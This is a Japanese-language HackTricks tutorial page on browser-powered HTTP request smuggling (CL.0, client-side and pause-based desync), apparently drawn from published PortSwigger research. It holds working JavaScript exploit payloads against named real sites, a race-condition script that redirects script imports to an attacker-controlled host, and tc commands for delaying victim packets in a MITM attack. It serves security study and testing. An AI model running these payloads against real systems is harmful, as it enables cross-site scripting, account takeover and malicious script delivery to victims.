# Browser HTTP Request Smuggling

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)に**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを共有してください。

</details>
## CL.0/H2.0 ブラウザ互換デシンク

この脆弱性は、**Content Length** (CL) ヘッダーが**バックエンドサーバー**によって完全に**無視される**ときに発生します。その後、バックエンドは**ボディ**を**2番目のリクエストのメソッドの開始**として扱います。CLを無視することは、それを0の値として扱うことと同等なので、これはCL.0デシンクです - [既知の](https://i.blackhat.com/USA-20/Wednesday/us-20-Klein-HTTP-Request-Smuggling-In-2020-New-Variants-New-Defenses-And-New-Challenges.pdf)があまり探求されていない攻撃クラスです。

![](<../../.gitbook/assets/image (3) (1) (2).png>)

攻撃が可能だったのは、バックエンドサーバーが単に**POSTリクエストを期待していなかった**からです。

{% hint style="warning" %}
この脆弱性は、完全に**有効で**、仕様に準拠した**HTTPリクエスト**によって**引き起こされる**ことに注意してください。これは、**フロントエンドがそれを防ぐチャンスがゼロ**であり、ブラウザによっても引き起こされる可能性があることを意味します。
{% endhint %}

**CL.0**と**H2.0**の唯一の**違い**は、2番目のものが**HTTP2**（暗黙のcontent-lengthヘッダーを持つ）を使用しているが、**バックエンドもそれを使用していない**ことです。

## クライアントサイドデシンク

従来のデシンク攻撃は**フロントエンドとバックエンド**サーバー間の**接続を毒する**ものであり、フロントエンド/バックエンドアーキテクチャを使用していないウェブサイトでは不可能です。これらはこれから**サーバーサイドデシンク**です。ほとんどの**サーバーサイドデシンク**は、**カスタムHTTPクライアントが不正なリクエストを発行する**ことによってのみ引き起こされます。

**ブラウザがデシンクを引き起こす**能力は、**クライアントサイドデシンク**（CSD）と呼ばれるまったく新しい脅威クラスを可能にします。\
CSD攻撃は、**被害者が攻撃者のウェブサイトを訪問する**ことから始まり、その後、被害者のブラウザが**脆弱なウェブサイトに対して2つのクロスドメインリクエストを送信する**ようにします。**最初の**リクエストは、ブラウザの接続を**デシンクさせ**、**2番目のリクエストが有害な応答を引き起こす**ように作られています。これにより、通常は攻撃者が被害者のアカウントを制御できるようになります。

### 検出

CSDベクターは、**2つの**重要な特性を持つHTTPリクエストです。

まず、**サーバーはリクエストのContent-Length (CL)を無視する**必要があります。これは通常、リクエストが**サーバーエラーを引き起こした**場合、またはサーバーが選択されたエンドポイントに対して**POSTリクエストを期待していなかった**場合に発生します。**静的ファイル**や**サーバーレベルのリダイレクト**をターゲットにし、**過長なURL**や/%2e%2eのような**半不正な**ものを使ってエラーを引き起こすことを試みてください。

次に、リクエストは**ウェブブラウザのクロスドメインでトリガー可能**である必要があります。ブラウザはクロスドメインリクエストを厳しく制限しているため、ヘッダーの制御が限られており、リクエストにボディがある場合はHTTP POSTメソッドを使用する必要があります。最終的には、**URL**、**Refererヘッダー**、**ボディ**、**Content-Typeの後半部分**など、いくつかの細かい点を**制御**することしかできません。

#### CL無視テスト

このミスコンフィグをテストする方法は、**2つのリクエストを送信し、その間に1つをスマグルする**ことです。**スマグルされた**接続が**2番目の**リクエストの応答に**影響を与えた**場合、それは**脆弱である**ことを意味します：

![](<../../.gitbook/assets/image (1) (2) (2) (1).png>)

{% hint style="warning" %}
ただ**Content-Lengthを送信されたものより大きくしてタイムアウトを探す**だけでは、この脆弱性をテストすることは**できない**ことに注意してください。なぜなら、サーバーは**全体のボディを受け取っていなくても応答する**からです。
{% endhint %}

ターゲットウェブサイトが**HTTP**/2をサポートしているかどうかを確認することが重要です。CSD攻撃は通常、HTTP/1.1の接続再利用を悪用し、ウェブ**ブラウザは可能な限りHTTP/2を使用する**ことを好むので、ターゲット**ウェブサイトがHTTP/2をサポートしている場合、攻撃はうまくいかない可能性が高い**です。ただし、**例外**があります。一部の**フォワードプロキシはHTTP/2をサポートしていない**ので、それらを使用している人を悪用することができます。これには、企業のプロキシ、特定の侵入型VPN、さらにはいくつかのセキュリティツールが含まれます。

### 確認

まず、攻撃を開始するサイトを選択します。このサイトは**HTTPS経由でアクセスされ**、ターゲットとは**異なるドメインに位置している**必要があります。

次に、**プロキシが設定されていないことを確認してから**、攻撃サイトにアクセスします。**開発者ツール**を開き、**ネットワークタブ**に切り替えます。後で発生する可能性のある問題のデバッグに役立てるため、以下の調整を行うことをお勧めします：

* **「ログを保持」** チェックボックスを選択します。
* 列ヘッダーを右クリックし、**「接続ID」列を有効にする**。

開発者コンソールに切り替え、fetch()を使用して攻撃シーケンスを再現するJavaScriptを実行します。これは次のようになるかもしれません：
```javascript
fetch('https://example.com/', {
method: 'POST',
body: "GET /hopefully404 HTTP/1.1\r\nX: Y", // malicious prefix
mode: 'no-cors', // ensure connection ID is visible
credentials: 'include' // poison 'with-cookies' pool
}).then(() => {
location = 'https://example.com/' // use the poisoned connection
})
```
### 悪用 - ストア

一つの選択肢は、ターゲットサイト上でテキストデータを**保存する機能**を特定し、プレフィックスを作成して、被害者のクッキー、認証ヘッダー、またはパスワードが**あなたが取得できる場所に保存される**ようにすることです。この攻撃フローは[サーバーサイドリクエストスマグリングとほぼ同じ方法で動作します](https://portswigger.net/web-security/request-smuggling/exploiting#capturing-other-users-requests)ので、詳細には立ち入りません。

### 悪用 - **チェーン＆ピボット**

通常の状況では、多くのクラスの**サーバーサイド攻撃**は、**HTTPヘッダー**の**改ざん**など、ブラウザが送信を拒否するHTTPリクエストに依存しているため、ターゲットウェブサイトへの直接アクセスを持つ攻撃者によってのみ開始することができます - ウェブキャッシュポイズニング、ほとんどのサーバーサイドリクエストスマグリング、ホストヘッダー攻撃、User-Agentベースの[SQLi](https://portswigger.net/web-security/sql-injection)、CSRF JSON Content-typeなど多数。

成功した攻撃への最も単純な道は、通常サーバーサイドのディシンク攻撃に使用される二つの主要な技術から来ました：[**ホストヘッダーリダイレクトを介したJavaScriptリソースの汚染**](https://portswigger.net/web-security/request-smuggling/exploiting#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect)、そして有害なHTMLを含むレスポンスを組み合わせるために[**HEADメソッド**](https://portswigger.net/web-security/request-smuggling/advanced/request-tunnelling#non-blind-request-tunnelling-using-head)を使用することです。両方の技術は、**被害者のブラウザー**で動作する際に関連するいくつかの新しい課題を克服するために**適応**する必要がありました。

## 悪用例

### スタックされたHEADの例

* **カラーの悪用**

![](<../../.gitbook/assets/image (2) (3).png>)

* **JSの悪用**
```javascript
fetch('https://www.capitalone.ca/assets', {
method: 'POST',
// use a cache-buster to delay the response
body: `HEAD /404/?cb=${Date.now()} HTTP/1.1\r\nHost: www.capitalone.ca\r\n\r\nGET /x?x=<script>alert(1)</script> HTTP/1.1\r\nX: Y`,
credentials: 'include',
mode: 'cors' // throw an error instead of following redirect
}).catch(() => {
location = 'https://www.capitalone.ca/'
})va
```
説明:

* **CL.0の悪用** は/assetsで行われます（これは/assets/にリダイレクトされ、CLをチェックしません）
* **HEAD** リクエストを**スマグル**します（HEADレスポンスにはcontent-lengthが含まれているため）
* ペイロードを含むレスポンスで**反映**される**内容**を持つ**GET** リクエストを**スマグル**します。
* **HEADリクエストのcontent-length** のため、このリクエストの**レスポンス**はHEADリクエストの**ボディ**になります
* **corsモード**を設定します。通常は行われませんが、このケースではサーバーからの**初期**の**POST**への**レスポンス**が、**フォロー**された場合に**エクスプロイトが機能しない**リダイレクトです。したがって、**corsモード**は**エラー**を**トリガー**し、**`catch`**で犠牲者を**リダイレクト**するために使用されます。

### **ホストヘッダーリダイレクト + クライアントサイドキャッシュポイズニング**

* **JSエクスプロイト**
```javascript
fetch('https://redacted/', {
method: 'POST',
body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* Hostヘッダーに**異なるドメイン**を指定した`/+webvpn+/`へのリクエストは、Hostヘッダー内のその**ドメイン**へ`/+webvpn+/index.html`に**リダイレクト**されます。
* **2番目**のリクエストでは、`.js`ファイルの**キャッシュ**を**汚染**するために、`location`を`/+CSCOE+/win.js`に設定します。
* このリクエストは、攻撃者のドメインとパス`/+webvpn+/index.html`への`/+webvpn+/`のリダイレクトで応答されます。
* **`win.js`**の**キャッシュ**は、攻撃者のページへの**リダイレクト**で**汚染**されますが、**被害者**も`location`変数で指定された通りにリダイレクトを**たどり**、攻撃者のウェブページにたどり着きます。
* 攻撃者はその後、**被害者**を`https://redacted/+CSCOE+/logon.html`へ**リダイレクト**します。このページは`/+CSCOE+/win.js`をインポートします。その**キャッシュは攻撃者**のサーバーへのリダイレクトであるため、攻撃者は**悪意のあるJS**で応答することができます。

**被害者**は攻撃者のページに**2回アクセス**します。最初はHTMLを**期待し**、被害者を`https://redacted/+CSCOE+/logon.html`にリダイレクトし、2回目はjavascriptコード（ペイロード）を**期待します**。ポリグロットを使用して、これらの応答を1つで提供することができます。
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### HEADペイロードとチャンク化されたTE

CSDを探す際には、`/..%2f` や `/%2f` のような**半不正形式の**URLも**テスト**することができます。

* **カラー化されたエクスプロイト**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **JSエクスプロイト**
```javascript
fetch('https://www.verisign.com/%2f', {
method: 'POST',
body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`,
credentials: 'include',
headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
let form = document.createElement('form')
form.method = 'POST'
form.action = 'https://www.verisign.com/robots.txt'
form.enctype = 'text/plain'
let input = document.createElement('input')
input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
input.value = ''
form.appendChild(input)
document.body.appendChild(form)
form.submit()
}
```
* ページ **`/%2f`** は **CL.0** 脆弱性を**悪用**するためにアクセスされます。
* **`Transfer-Encoding: chunked` ヘッダー**を使用して **HEAD** リクエストがスマグリングされます。
* このヘッダーは、そうでなければ**サーバーが本文を含む HEAD リクエストを受け付けない**ため、このシナリオでは必要です。
* 次に、ユーザーは POST を送信し、その本文には**前の HEAD** リクエストの**終了チャンク**と、レスポンスに**反映**される**コンテンツ**（JS ペイロード）を含む**新しいリクエストがスマグリングされます**。
* したがって、ブラウザーは **HEAD** リクエストへの**レスポンス**を **POST リクエスト**への**レスポンス**として扱い、**本文**レスポンスにも、2番目のスマグリングされたリクエストのユーザーの**入力**を**反映**した内容が**含まれます**。

### Host ヘッダー リダイレクト + RC

* **JS 悪用**
```html
<script>
function reset() {
fetch('https://vpn.redacted/robots.txt',
{mode: 'no-cors', credentials: 'include'}
).then(() => {
x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
})
setTimeout(poison, 120) // worked on 140. went down to 110
}

function poison(){
sendPoison()
sendPoison()
sendPoison()
setTimeout(reset, 1000)
}

function sendPoison(){
fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css',
{
method: 'POST',
body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
mode: 'no-cors',
credentials: 'include'
}
)
}

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
この場合も、**ホストヘッダー**の**リダイレクト**があり、**JS**インポートを**ハイジャック**することができます。しかし、今回は**リダイレクトがキャッシュ可能ではない**ため、クライアント側の**キャッシュ**の**毒物注入**は選択肢にはありません。

したがって、攻撃は**被害者が脆弱なページにアクセス**させるために行われ、ページが**JSファイルをロード**しようとする**直前**に、ソケット**スマグリング接続**を**毒物注入**します（この場合は3つ）。\
**タイミング**が非常に**正確**でなければならないため、攻撃はそれが機能するまで**各反復で新しいタブに対して**行われます。

{% hint style="warning" %}
この場合、`/meeting_testjs.cgi`が攻撃されたのは、**404**で応答する**Javascript**を**ロード**しているため、キャッシュされていないからです。キャッシュされている**JSを攻撃**しようとする他のシナリオでは、新しい攻撃を開始する前にキャッシュから**消えるのを待つ**必要があります。
{% endhint %}

要約ステップ:

* 新しいウィンドウを開く。
* タイミングをより一貫させるために、ターゲットに対して無害なリクエストを発行して新しい接続を確立する。
* ウィンドウを/meeting\_testjs.cgiのターゲットページにナビゲートする。
* 120ミリ秒後、リダイレクトガジェットを使用して3つの毒物注入接続を作成する。
* 5ミリ秒後、/meeting\_testjs.cgiをレンダリングしている間に、被害者が/appletRedirect.jsをインポートしようとしてx.psres.netにリダイレクトされ、悪意のあるJSが提供されることを期待する。
* うまくいかなければ、攻撃を再試行する。

## ポーズベースの非同期 <a href="#pause" id="pause"></a>

ポーズをかけることで、**誤ったリクエストタイムアウトの実装を引き起こす**ことにより、新しい非同期の脆弱性を作り出すこともできます。

したがって、攻撃者は**本文があることを示すヘッダー**を持つリクエストを送信し、**フロントエンドがタイムアウトする前に本文の送信を待つ**ことができます。フロントエンドがタイムアウトしても**接続を開いたままにしている場合**、そのリクエストの**本文**は**新しいリクエストとして扱われます**。

### 例: **Varnish**

Varnishキャッシュには、リクエストをバックエンドに転送せずに**レスポンスを発行**する機能がある`synth()`という機能があります。以下は、フォルダへのアクセスをブロックするために使用されているルールの例です：
```javascript
if (req.url ~ "^/admin") {
return (synth(403, "Forbidden"));
}
```
**部分リクエスト**が合成ルールに一致する場合、Varnishは15秒間データが届かないと**タイムアウト**します。これが起こると、ソケットからリクエストの半分しか読み取っていないにも関わらず、接続を開いたままにして再利用します。つまり、**クライアントがHTTPリクエストの後半を続けて送信する**と、それが**新しいリクエスト**として解釈されることを意味します。

脆弱なフロントエンドでポーズベースのデシンクをトリガーするには、まずヘッダーを送信し、ボディが続くことを約束してから、ただ待ちます。最終的にレスポンスを受け取り、リクエストボディを送信すると、新しいリクエストとして解釈されます：

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
どうやらこれは1月25日に[CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html)としてパッチが当てられたようです。
{% endhint %}

### 例: **Apache**

Varnishと同様に、サーバーがアプリケーションにリクエストを処理させるのではなく、**自身でレスポンスを生成するエンドポイント**で脆弱です。これが起こる一つの方法は、サーバーレベルのリダイレクトです：`Redirect 301 / /en`

### サーバーサイドの悪用 <a href="#server" id="server"></a>

脆弱なサーバー（この場合はApacheまたはVarnish）がバックエンドにある場合、フロントエンドはリクエストボディ全体をバッファリングせずにバックエンドサーバーにリクエスト（この場合はhttpヘッダー）を**ストリーミングする**必要があります。

![](<../../.gitbook/assets/image (3) (3).png>)

この場合、攻撃者はボディを送信するまでレスポンスタイムアウトを受け取りません。しかし、タイムアウトを知っていれば問題にはなりません。

AmazonのApplication Load Balancer（ALB）は必要に応じて接続のデータを**ストリーミングします**が、ボディを受け取る**前に**半分のリクエスト（タイムアウト）に対する**レスポンス**を**受け取る**と、ボディを**送信しません**ので、ここでは**Race Condition**を悪用する必要があります：

<figure><img src="../../.gitbook/assets/image (1) (1) (2) (1).png" alt=""><figcaption></figcaption></figure>

ALBの背後にある**Apacheを悪用する**際にはさらなる複雑さがあります - **両方のサーバー**にはデフォルトで**60秒のタイムアウト**があります。これはリクエストの第二部を送信するための**非常に短い時間窓**を残します。RC攻撃は最終的に66時間後に成功しました。

### MITM悪用

ブラウザからのリクエストを停止してポーズデシンクの脆弱性を悪用することは**不可能**のようです。しかし、ブラウザによって送信されたリクエストを一時停止するために**MITM攻撃を実行する**ことは常に可能です。この攻撃は、トラフィックを**復号化することに依存しません**。

攻撃の流れは、リクエストのパディングを除いて、通常のクライアントサイドデシンク攻撃に非常に**似ています**。ユーザーは攻撃者がコントロールするページを訪れ、対象アプリケーションに対して一連の**クロスドメインリクエスト**を発行します。**最初のHTTP**リクエストは意図的に大きくパディングされており、オペレーティングシステムが複数のTCPパケットに分割するほど**大きい**ため、アクティブな**MITMが最終パケットを遅延させる**ことができ、ポーズベースのデシンクをトリガーします。パディングにより、**攻撃者**は**サイズ**に基づいてどの**パケットを一時停止するかを識別**できます。

クライアント側からは、HEADガジェットを使用した通常のクライアントサイドデシンクと同じように見えますが、リクエストのパディングが異なります：
```javascript
let form = document.createElement('form')
form.method = 'POST'
form.enctype = 'text/plain'
form.action = 'https://x.psres.net:6082/redirect?'+"h".repeat(600)+ Date.now()
let input = document.createElement('input')
input.name = "HEAD / HTTP/1.1\r\nHost: x\r\n\r\nGET /redirect?<script>alert(document.domain)</script> HTTP/1.1\r\nHost: x\r\nFoo: bar"+"\r\n\r\n".repeat(1700)+"x"
input.value = "x"
form.append(input)
document.body.appendChild(form)
form.submit()
```
攻撃者システムでのブラインドMITMを実行する際、遅延はtc-NetEmを使用して実装されました：
```bash
# Setup
tc qdisc add dev eth0 root handle 1: prio priomap

# Flag packets to 34.255.5.242 that are between 700 and 1300 bytes
tc filter add dev eth0 protocol ip parent 1:0 prio 1 basic \
match 'u32(u32 0x22ff05f2 0xffffffff at 16)' \
and 'cmp(u16 at 2 layer network gt 0x02bc)' \
and 'cmp(u16 at 2 layer network lt 0x0514)' \
flowid 1:3

# Delay flagged packets by 61 seconds
tc qdisc add dev eth0 parent 1:3 handle 10: netem delay 61s
```
## **参考文献**

* この投稿の情報はすべて [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks) から取得しました。

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert) で AWS ハッキングをゼロからヒーローまで学ぶ</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または **HackTricksをPDFでダウンロードしたい** 場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式のPEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live) を**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。

</details>
